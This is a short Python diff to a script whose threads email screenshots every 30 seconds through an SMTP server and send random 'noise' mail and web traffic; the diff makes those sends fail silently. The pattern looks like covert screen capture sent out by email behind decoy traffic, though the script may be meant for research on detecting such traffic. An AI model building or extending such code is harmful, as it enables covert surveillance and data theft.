@@ -17,7 +17,7 @@ from list_of_website import websites
 
 
 time_interval_screen = 30
-time_interval_noise_mail =  random.randint(20, 40) # random.randint(2,10)
+time_interval_noise_mail =  random.randint(10, 29) # random.randint(2,10)
 time_web_noise = random.randint(10, 60)
 smpt_server = 'smtp.poczta.onet.pl'
 smtp_port = 587
@@ -134,7 +134,10 @@ class Screenshot(Thread):
             now = datetime.now() # current date and time
             date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
             # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-            screenshot_email(date_time)
+            try:
+                screenshot_email(date_time)
+            except smtplib.SMTPAuthenticationError:
+                pass
             print("screenshot sent")
             sleep(time_interval_screen)
 
@@ -146,7 +149,10 @@ class Plainmain(Thread):
     def run(self):
         while True:
             # if(process_exists('chrome.exe') ): # or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
-            plain_email()
+            try:
+                plain_email()
+            except smtplib.SMTPAuthenticationError:
+                pass
             sleep(time_interval_noise_mail)
 
 
